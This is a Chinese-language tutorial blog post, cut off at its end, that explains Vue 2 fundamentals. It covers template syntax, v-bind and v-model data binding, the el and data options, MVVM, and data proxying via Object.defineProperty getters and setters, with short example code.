    <content type="html"><![CDATA[<h1 id="1-vue基础知识和原理"><a href="#1-vue基础知识和原理" class="headerlink" title="1. vue基础知识和原理"></a>1. vue基础知识和原理</h1><h2 id="1-1-初识Vue"><a href="#1-1-初识Vue" class="headerlink" title="1.1 初识Vue"></a>1.1 初识Vue</h2><ul><li>想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象</li><li>demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法</li><li>demo容器里的代码被称为【Vue模板】</li><li>Vue实例和容器是一一对应的</li><li>真实开发中只有一个Vue实例，并且会配合着组件一起使用</li><li><code>&#123;&#123;xxx&#125;&#125;</code>是Vue的语法：插值表达式，<code>&#123;&#123;xxx&#125;&#125;</code>可以读取到data中的所有属性</li><li>一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)</li></ul><blockquote><p>初始示例代码</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- 准备好一个容器 --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello，&#123;&#123;name.toUpperCase()&#125;&#125;，&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-comment">//创建Vue实例</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#demo&#x27;</span>, <span class="hljs-comment">//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123; <span class="hljs-comment">//data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;hello,world&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;北京&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-2-模板语法"><a href="#1-2-模板语法" class="headerlink" title="1.2 模板语法"></a>1.2 模板语法</h2><p>Vue模板语法有2大类:</p><ul><li>插值语法：</li></ul><p>功能：用于解析标签体内容</p><p>写法：<code>&#123;&#123;xxx&#125;&#125;</code>，xxx是js表达式，且可以直接读取到data中的所有属性</p><ul><li>指令语法:</li></ul><p>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…）</p><p>举例：v-bind:href&#x3D;“xxx” 或 简写为 :href&#x3D;“xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;root&quot;</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>插值语法<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>指令语法<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br>    &lt;!-- 这里是展示被<span class="hljs-title class_">Vue</span>指令绑定的属性，引号内写的是js表达式 --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;school.url.toUpperCase()&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;school.url&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">school</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;百度&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;)</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-3-数据绑定"><a href="#1-3-数据绑定" class="headerlink" title="1.3 数据绑定"></a>1.3 数据绑定</h2><p>Vue中有2种数据绑定的方式：</p><ul><li><p>单向绑定(v-bind)：数据只能从data流向页面</p></li><li><p>双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data</p><blockquote><p>tips:</p></blockquote><ol><li><p>双向绑定一般都应用在表单类元素上（如：input、select等）</p></li><li><p>v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值</p></li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;root&quot;</span>&gt;<br>&lt;!-- 普通写法 单向数据绑定 --&gt;<br>    单向数据绑定：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-<span class="hljs-attr">bind</span>:value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    双向数据绑定：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-<span class="hljs-attr">model</span>:value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    <br>    &lt;!-- 简写 v-<span class="hljs-attr">model</span>:value 可以简写为 v-model，因为v-model默认收集的就是value值--&gt;<br>    单向数据绑定：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> :value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    双向数据绑定：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-model=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;)</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-4-el与data的两种写法"><a href="#1-4-el与data的两种写法" class="headerlink" title="1.4 el与data的两种写法"></a>1.4 el与data的两种写法</h2><p>el有2种写法</p><ul><li><p>new Vue时候配置el属性</p></li><li><p>先创建Vue实例，随后再通过vm.$mount(‘#root’)指定el的值</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>   <span class="hljs-comment">// 第一种 </span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,<br>        &#125;<br>&#125;)<br>    <br>    <span class="hljs-comment">// 第二种</span><br>    vm.$mount(<span class="hljs-string">&#x27;#root&#x27;</span>)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>data有2种写法</p><ul><li><p>对象式</p></li><li><p>函数式</p><p>不可以使用<a href="https://blog.csdn.net/weixin_45112114/article/details/123358639?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166830462716800184149271%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166830462716800184149271&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123358639-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v2&utm_term=js%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">箭头函数</a>，使用箭头函数调用对象就变成了<code>Window</code></p></li></ul><blockquote><p>在组件中，data必须使用函数式。使用对象式就相当于设置为静态变量。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>        <span class="hljs-comment">// 第一种</span><br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,<br>        &#125;<br>        <br>        <span class="hljs-comment">// 第二种</span><br>        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span><br>            &#125;<br>    &#125;<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="1-5-Vue中的MVVM"><a href="#1-5-Vue中的MVVM" class="headerlink" title="1.5 Vue中的MVVM"></a>1.5 Vue中的MVVM</h2><ul><li><p>M：模型(Model) ：data中的数据</p></li><li><p>V：视图(View) ：模板代码</p></li><li><p>VM：视图模型(ViewModel)：Vue实例</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221112115435610.png" alt="image-20221112115435610"></p></li></ul><h2 id="1-6-数据代理"><a href="#1-6-数据代理" class="headerlink" title="1.6 数据代理"></a>1.6 数据代理</h2><blockquote><p>了解数据代理需要js的一些知识：Object.defineProperty()，属性标志，属性描述符，getter，setter。。。</p></blockquote><p>建议学习文章地址：</p><p><a href="https://zh.javascript.info/property-descriptors">https://zh.javascript.info/property-descriptors</a></p><p><a href="https://zh.javascript.info/property-accessors">https://zh.javascript.info/property-accessors</a></p><p>这里简单介绍一下：</p><p><strong>属性标志</strong> :</p><p>对象属性（properties），除 <strong><code>value</code></strong> 外，还有三个特殊的特性（attributes），也就是所谓的“标志”</p><ul><li><strong><code>writable</code></strong> — 如果为 <code>true</code>，则值可以被修改，否则它是只可读的</li><li><strong><code>enumerable</code></strong> — 如果为 <code>true</code>，则表示是可以遍历的，可以在for… .in Object.keys()中遍历出来</li><li><strong><code>configurable</code></strong> — 如果为 <code>true</code>，则此属性可以被删除，这些特性也可以被修改，否则不可以</li></ul><p><strong>Object.getOwnPropertyDescriptor(obj, propertyName)</strong></p><blockquote><p>这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> user = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John&quot;</span><br>&#125;;<br><br><span class="hljs-keyword">let</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(user, <span class="hljs-string">&#x27;name&#x27;</span>);<br> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(descriptor)<br>   <br>    <span class="hljs-comment">/* 属性描述符：</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      &quot;value&quot;: &quot;John&quot;,</span><br><span class="hljs-comment">      &quot;writable&quot;: true,</span><br><span class="hljs-comment">      &quot;enumerable&quot;: true,</span><br><span class="hljs-comment">     &quot;configurable&quot;: true</span><br><span class="hljs-comment">   &#125;    */</span><br></code></pre></td></tr></table></figure><blockquote><p>打印结果</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09b4bf67bb7843388fecd7da1572901f.png" alt="在这里插入图片描述"></p><p><strong>Object.defineProperty</strong> (obj, prop, descriptor)</p><blockquote><p>obj：要定义属性的对象。</p><p>prop：要定义或修改的属性的名称</p><p>descriptor：要定义或修改的属性描述符</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John&quot;</span><br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(user, <span class="hljs-string">&quot;name&quot;</span>, &#123;<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br>user.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Pete&quot;</span>;<br><br><span class="hljs-comment">// 打印后还是显示 &#x27;John&#x27;,无法修改name值</span><br></code></pre></td></tr></table></figure><p>其他的属性标志就不演示了，接下来看重点：访问器属性。</p><p><strong>访问器属性 ：</strong></p><p>本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。</p><p>访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 <code>get</code> 和 <code>set</code> 表示：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">name</span>() &#123;<br>        <span class="hljs-comment">// 当读取 obj.propName 时，getter 起作用</span><br>    &#125;,<br>    <span class="hljs-keyword">set</span> <span class="hljs-title function_">name</span>() &#123;<br>        <span class="hljs-comment">// 当执行 obj.name = value 操作时，setter 起作用</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>更复杂一点的使用</strong></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br><span class="hljs-attr">surname</span>: <span class="hljs-string">&#x27;gao&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;han&#x27;</span><br>    <br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">fullName</span>() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">fullName</span>)<br><br></code></pre></td></tr></table></figure><p>从外表看，访问器属性看起来就像一个普通属性。这就是访问器属性的设计思想。我们不以函数的方式 <strong>调用</strong> <code>user.fullName</code>，我们正常<strong>读取</strong> 它：getter 在幕后运行。</p><blockquote><p>vue的计算属性的底层构造感觉用到了这种思想，我目前还没看过源码，是这样猜想的。</p></blockquote><p>截至目前，<code>fullName</code> 只有一个 getter。如果我们尝试赋值操作 <code>user.fullName=</code>，将会出现错误：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br><span class="hljs-attr">surname</span>: <span class="hljs-string">&#x27;gao&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;han&#x27;</span><br>    <br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">fullName</span>() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>;<br>    &#125;<br><br><span class="hljs-keyword">set</span> <span class="hljs-title function_">fullName</span>(<span class="hljs-params">value</span>) &#123;<br>        <span class="hljs-comment">// 这个用到了新语法 结构赋值</span><br>        [<span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>] = value.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br>&#125;<br><br>user.<span class="hljs-property">fullName</span> = <span class="hljs-string">&#x27;Li Hua&#x27;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">surname</span>);<br></code></pre></td></tr></table></figure><p><strong>终于可以介绍数据代理了</strong> ：</p><p>数据代理：通过一个对象代理对另一个对象中属性的操作（读&#x2F;写）</p><p>先来看个案例：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">x</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> obj2 = &#123;<br>    <span class="hljs-attr">y</span>: <span class="hljs-number">200</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>这时候提一个需求：我们想要访问 <strong>obj</strong> 中的 <strong>x</strong> 的值，但我们最好不要直接去访问 <strong>obj</strong> ,而是想要通过 <strong>obj2</strong>这个代理对象去访问。</p><p>这时候就可以用上 <strong>Object.defineProperty()</strong> ，给 <strong>obj2</strong> 添加上访问器属性（也就是getter和setter）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">x</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> obj2 = &#123;<br>    <span class="hljs-attr">y</span>: <span class="hljs-number">200</span><br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj2, <span class="hljs-string">&#x27;x&#x27;</span>, &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-property">x</span>;<br>    &#125;,<br>    <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>) &#123;<br>        obj.<span class="hljs-property">x</span> = value;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><blockquote><p>这就是数据代理，也不难吧</p></blockquote><p><strong>接下来介绍Vue中的数据代理</strong></p><ul><li>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读&#x2F;写）</li><li>Vue中数据代理的好处：更加方便的操作data中的数据</li><li>基本原理：<ul><li>通过Object.defineProperty()把data对象中所有属性添加到vm上。</li><li>为每一个添加到vm上的属性，都指定一个getter&#x2F;setter。</li><li>在getter&#x2F;setter内部去操作（读&#x2F;写）data中对应的属性。</li></ul></li></ul><p>我来用一个案例来详细解释这一个过程。</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;家里蹲大学&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>我们在控制台打印 new 出来的 vm</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110350315.png" alt="image-20221124110350315"></p><p>可以看到，写在配置项中的 data 数据被 绑定到了 vm 对象上，我先来讲结果，是 Vue 将 _data 中的 name，address 数据 代理到<br>vm 本身上。</p><blockquote><p>一脸懵逼？</p></blockquote><p>先来解释下_data 是啥， _data 就是 vm 身上的 _data 属性，就是下图那个</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110459865.png" alt="image-20221124110459865"></p><p>这个 _data 是从哪来的？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;家里蹲大学&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>new Vue 时， Vue 通过一系列处理， 将匹配项上的 data 数据绑定到了 _data<br>这个属性上，并对这个属性进行了处理（数据劫持），但这个属性就是来源于配置项中的 data，我们可以来验证一下。</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span 